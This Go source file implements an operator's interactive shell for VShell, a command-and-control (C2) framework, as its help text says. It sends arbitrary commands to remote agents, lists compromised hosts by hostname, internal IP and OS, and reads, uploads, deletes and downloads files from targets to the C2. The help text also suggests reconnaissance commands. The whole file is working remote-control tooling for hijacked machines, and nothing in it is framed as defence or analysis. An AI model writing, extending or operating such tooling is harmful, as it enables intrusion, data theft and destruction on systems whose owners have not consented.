package main

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

type repl struct {
	c           *Client
	id          int
	timeout     time.Duration
	raw         bool
	interactive bool
	out         io.Writer

	// cwd/isWindows 记录客户端侧维护的当前目录。
	// VShell 的 shell 是每条命令独立执行，cd 不会在目标端保留，
	// 因此这里把 cd 变成"记住目录 + 每条命令前先 cd 过去"。
	cwd       string
	isWindows bool
}

// runShell 进入某个 Agent 的交互式命令会话。
// 以 ":" 开头的是本地元命令，其余内容原样发送到 Agent。
func runShell(c *Client, id int, timeout time.Duration, raw bool, in io.Reader, out io.Writer, interactive bool) error {
	r := &repl{c: c, id: id, timeout: timeout, raw: raw, interactive: interactive, out: out}
	if interactive {
		fmt.Fprintf(out, "已连接 Agent %d（:help 查看本地命令，:exit 退出，Ctrl-D 结束）\n", id)
	}
	r.initCwd()

	sc := bufio.NewScanner(in)
	sc.Buffer(make([]byte, 0, 64*1024), 1<<20)
	for {
		if interactive {
			fmt.Fprint(out, r.prompt())
		}
		if !sc.Scan() {
			if interactive {
				fmt.Fprintln(out)
			}
			return nil
		}
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		if strings.HasPrefix(line, ":") {
			exit, err := r.meta(line)
			if err != nil {
				fmt.Fprintf(out, "错误: %v\n", err)
			}
			if exit {
				return nil
			}
			continue
		}

		// 本地处理的目录命令
		if line == "pwd" && r.cwd != "" {
			fmt.Fprintln(out, r.cwd)
			continue
		}
		if arg, ok := splitCD(line); ok {
			if err := r.changeDir(arg); err != nil {
				fmt.Fprintf(out, "错误: %v\n", err)
			}
			continue
		}

		wrapped := r.wrap(line)
		rawOut, err := c.ExecShell(r.id, wrapped, r.timeout)
		r.printResult(rawOut, err, wrapped)
	}
}

func (r *repl) prompt() string {
	if r.cwd == "" {
		return fmt.Sprintf("agent-%d> ", r.id)
	}
	return fmt.Sprintf("agent-%d:%s> ", r.id, r.cwd)
}

func (r *repl) printResult(rawOut string, err error, command string) {
	if err != nil {
		var se *ShellError
		if errors.As(err, &se) && strings.TrimSpace(se.Output) != "" {
			text := strings.TrimRight(r.display(se.Output, command), "\r\n")
			if strings.TrimSpace(text) != "" {
				fmt.Fprintln(r.out, text)
			}
		}
		fmt.Fprintf(r.out, "错误: %v\n", err)
		return
	}
	text := strings.TrimRight(r.display(rawOut, command), "\r\n")
	if strings.TrimSpace(text) == "" {
		text = "(无输出)"
	}
	fmt.Fprintln(r.out, text)
}

func (r *repl) display(raw, command string) string {
	if r.raw {
		return raw
	}
	return extractShellOutput(raw, command)
}

// ---------------- 目录跟踪 ----------------

// initCwd 探测默认目录：Linux/macOS 用 pwd，Windows 用 cd。
func (r *repl) initCwd() {
	r.cwd, r.isWindows = "", false

	if raw, err := r.c.ExecShell(r.id, "pwd", 8*time.Second); err == nil {
		if p := firstLine(extractShellOutput(raw, "pwd")); strings.HasPrefix(p, "/") {
			r.cwd = p
			return
		}
	}
	if raw, err := r.c.ExecShell(r.id, "cd", 8*time.Second); err == nil {
		if p := firstLine(extractShellOutput(raw, "cd")); looksWindowsPath(p) {
			r.cwd, r.isWindows = p, true
		}
	}
}

// changeDir 在客户端跟踪目录；实际会先 cd 到旧目录再 cd 到目标，拿到绝对路径。
func (r *repl) changeDir(arg string) error {
	target := strings.TrimSpace(arg)
	if r.isWindows && strings.HasPrefix(target, "/d ") {
		target = strings.TrimSpace(target[3:])
	}
	if target == "-" {
		return errors.New("不支持 cd -")
	}
	home := target == "" || target == "~"

	prefix := ""
	if r.cwd != "" {
		if r.isWindows {
			prefix = "cd /d " + winQuote(r.cwd) + " && "
		} else {
			prefix = "cd " + posixQuote(r.cwd) + " && "
		}
	}

	var cmd string
	if r.isWindows {
		if home {
			cmd = prefix + "cd /d %USERPROFILE% && cd"
		} else {
			cmd = prefix + "cd /d " + winQuote(target) + " && cd"
		}
	} else {
		if home {
			cmd = prefix + "cd && pwd"
		} else {
			cmd = prefix + "cd " + posixQuote(target) + " && pwd"
		}
	}

	raw, err := r.c.ExecShell(r.id, cmd, r.timeout)
	if err != nil {
		return err
	}
	newcwd := firstLine(extractShellOutput(raw, cmd))
	if r.isWindows {
		if !looksWindowsPath(newcwd) {
			return fmt.Errorf("无法解析目录: %q", newcwd)
		}
	} else if !strings.HasPrefix(newcwd, "/") {
		return fmt.Errorf("无法解析目录: %q", newcwd)
	}
	r.cwd = newcwd
	return nil
}

// wrap 给远程命令加上"先进入跟踪目录"的前缀。
func (r *repl) wrap(command string) string {
	if r.cwd == "" {
		return command
	}
	if r.isWindows {
		return "cd /d " + winQuote(r.cwd) + " && " + command
	}
	return "cd " + posixQuote(r.cwd) + " && " + command
}

func splitCD(line string) (string, bool) {
	if line == "cd" {
		return "", true
	}
	if strings.HasPrefix(line, "cd ") {
		return strings.TrimSpace(line[3:]), true
	}
	return "", false
}

func firstLine(s string) string {
	for _, ln := range strings.Split(s, "\n") {
		ln = strings.TrimSpace(strings.TrimSuffix(ln, "\r"))
		if ln == "" || ln == "(无输出)" {
			continue
		}
		return ln
	}
	return ""
}

func looksWindowsPath(s string) bool {
	return len(s) >= 3 &&
		((s[0] >= 'A' && s[0] <= 'Z') || (s[0] >= 'a' && s[0] <= 'z')) &&
		s[1] == ':' && (s[2] == '\\' || s[2] == '/')
}

func posixQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

func winQuote(s string) string {
	return `"` + s + `"`
}

// ---------------- 本地元命令 ----------------

func (r *repl) meta(line string) (bool, error) {
	fields := strings.Fields(line)
	cmd := strings.ToLower(fields[0])
	rest := strings.TrimSpace(strings.TrimPrefix(line, fields[0]))

	switch cmd {
	case ":exit", ":quit", ":q":
		return true, nil

	case ":help", ":h", ":?":
		fmt.Fprint(r.out, shellHelp)
		return false, nil

	case ":id", ":use":
		if rest == "" {
			return false, fmt.Errorf("用法: :id <agent_id>")
		}
		id, err := parseID(rest)
		if err != nil {
			return false, err
		}
		r.id = id
		r.initCwd()
		fmt.Fprintf(r.out, "已切换 Agent %d\n", id)
		return false, nil

	case ":timeout":
		if rest == "" {
			fmt.Fprintf(r.out, "当前单条命令超时: %s\n", r.timeout)
			return false, nil
		}
		secs, err := strconv.ParseFloat(rest, 64)
		if err != nil || secs <= 0 {
			return false, fmt.Errorf("用法: :timeout <秒>")
		}
		r.timeout = time.Duration(secs * float64(time.Second))
		fmt.Fprintf(r.out, "单条命令超时已设为 %.0fs\n", secs)
		return false, nil

	case ":raw":
		switch strings.ToLower(rest) {
		case "on", "true", "1":
			r.raw = true
		case "off", "false", "0":
			r.raw = false
		case "":
			r.raw = !r.raw
		default:
			return false, fmt.Errorf("用法: :raw [on|off]")
		}
		fmt.Fprintf(r.out, "raw 模式: %v\n", r.raw)
		return false, nil

	case ":info":
		d, err := r.c.Dashboard()
		if err != nil {
			return false, err
		}
		fmt.Fprintf(r.out, "版本: %s  在线 Agent: %d  监听器: %d/%d  隧道: %d  授权截止: %s\n",
			orDash(d.Version), d.ClientOnlineCount, d.ListenerOnlineCount,
			d.ListenerCount, d.Socks5Count, orDash(d.LicTime))
		return false, nil

	case ":clients":
		status := "all"
		if rest != "" {
			status = rest
		}
		st, err := normalizeStatus(status)
		if err != nil {
			return false, err
		}
		list, err := r.c.Agents(st)
		if err != nil {
			return false, err
		}
		if len(list.Items) == 0 {
			fmt.Fprintln(r.out, "(没有客户端)")
			return false, nil
		}
		rows := make([][]string, 0, len(list.Items))
		for _, a := range list.Items {
			mark := "-"
			if a.IsConnect {
				mark = "+"
			}
			cur := ""
			if fmt.Sprint(a.ID) == strconv.Itoa(r.id) {
				cur = "*"
			}
			rows = append(rows, []string{
				mark, cur, fmt.Sprint(a.ID), orDash(a.HostName),
				orDash(a.LocalIP), orDash(a.OsName),
			})
		}
		fmt.Fprintln(r.out, table([]string{"", "", "ID", "主机名", "内网IP", "系统"}, rows))
		return false, nil

	case ":ls":
		path := rest
		if path == "" {
			path = r.cwd
		}
		if path == "" {
			path = "C:/"
		}
		list, err := r.c.ListDir(r.id, path, 1, 200, "time", "descend")
		if err != nil {
			return false, err
		}
		if len(list.Items) == 0 {
			fmt.Fprintf(r.out, "目录为空或不存在: %s\n", path)
			return false, nil
		}
		rows := make([][]string, 0, len(list.Items))
		for _, f := range list.Items {
			t := "F"
			if f.IsDir {
				t = "D"
			}
			rows = append(rows, []string{t, orDash(f.Name), fmt.Sprint(f.Size), orDash(f.Time)})
		}
		fmt.Fprintf(r.out, "%s (%d 项):\n", path, len(list.Items))
		fmt.Fprintln(r.out, table([]string{"类型", "名称", "大小", "修改时间"}, rows))
		return false, nil

	case ":cat":
		if rest == "" {
			return false, fmt.Errorf("用法: :cat <远程文件>")
		}
		data, err := r.c.ReadFile(r.id, rest)
		if err != nil {
			return false, err
		}
		total := len(data)
		if total > 102400 {
			data = data[:102400]
		}
		if utf8.Valid(data) {
			fmt.Fprint(r.out, string(data))
			if total > len(data) {
				fmt.Fprintf(r.out, "\n...(已截断，共 %d bytes)\n", total)
			} else if len(data) > 0 && data[len(data)-1] != '\n' {
				fmt.Fprintln(r.out)
			}
		} else {
			fmt.Fprintf(r.out, "(二进制内容, %d bytes, base64)\n%s\n",
				len(data), base64.StdEncoding.EncodeToString(data))
		}
		return false, nil

	case ":put", ":upload":
		if rest == "" {
			return false, fmt.Errorf("用法: :put <本地文件> [远程路径]")
		}
		parts := strings.Fields(rest)
		remote := ""
		if len(parts) > 1 {
			remote = strings.Join(parts[1:], " ")
		}
		resp, err := r.c.Upload(r.id, parts[0], remote, 120*time.Second)
		if err != nil {
			return false, err
		}
		if !resp.OK() {
			return false, fmt.Errorf("%s", resp.ErrText())
		}
		target := resp.URL
		if target == "" {
			target = remote
		}
		fmt.Fprintf(r.out, "上传成功: %s -> %s\n", parts[0], orDash(target))
		return false, nil

	case ":get", ":download":
		if rest == "" {
			return false, fmt.Errorf("用法: :get <远程文件>")
		}
		var progress func(int)
		if r.interactive {
			progress = func(p int) { fmt.Fprintf(r.out, "\r进度: %d%%", p) }
		}
		size, err := r.c.DownloadFromAgent(r.id, rest, 30*time.Second, progress)
		if progress != nil {
			fmt.Fprintln(r.out)
		}
		if err != nil {
			return false, err
		}
		fmt.Fprintf(r.out, "下载完成: %s (%d bytes)\n", rest, size)
		return false, nil

	case ":rm", ":del":
		if rest == "" {
			return false, fmt.Errorf("用法: :rm <远程路径>")
		}
		if err := r.c.RemoveFile(r.id, rest); err != nil {
			return false, err
		}
		fmt.Fprintf(r.out, "已删除: %s\n", rest)
		return false, nil

	case ":pwd", ":cwd":
		if r.cwd != "" {
			fmt.Fprintln(r.out, r.cwd)
			return false, nil
		}
		raw, err := r.c.ExecShell(r.id, "pwd", r.timeout)
		if err != nil {
			return false, err
		}
		fmt.Fprintln(r.out, strings.TrimRight(extractShellOutput(raw, "pwd"), "\r\n"))
		return false, nil
	}

	return false, fmt.Errorf("未知本地命令 %s（:help 查看）", fields[0])
}

const shellHelp = `本地命令（以 : 开头，不会发到 Agent）:
  :help / :h            显示本帮助
  :exit / :quit / :q    退出会话（Ctrl-D 同效）
  :id <n> / :use <n>    切换 Agent
  :timeout [秒]          查看或设置单条命令超时
  :raw [on|off]         切换原始缓冲区输出
  :info                 面板状态
  :clients [all|online|offline]   Agent 列表
  :ls [路径]             列目录（默认当前目录）
  :cat <文件>            读文件（最多 100KB）
  :put <本地> [远程]     上传文件
  :get <远程文件>        下载到 C2
  :rm <路径>             删除文件/目录
  :pwd / :cwd           显示当前跟踪目录

目录:
  cd <目录> / cd .. / cd ~   由客户端跟踪目录
  pwd                       显示当前跟踪目录

其他输入会原样发送到 Agent 的 shell，例如:
  whoami
  "whoami & ipconfig"
  dir C:\Users

说明: VShell 的 shell 每条命令独立执行，cd 不会在目标端保留状态。
本客户端记住当前目录，并在每条命令前自动 cd 过去。
`
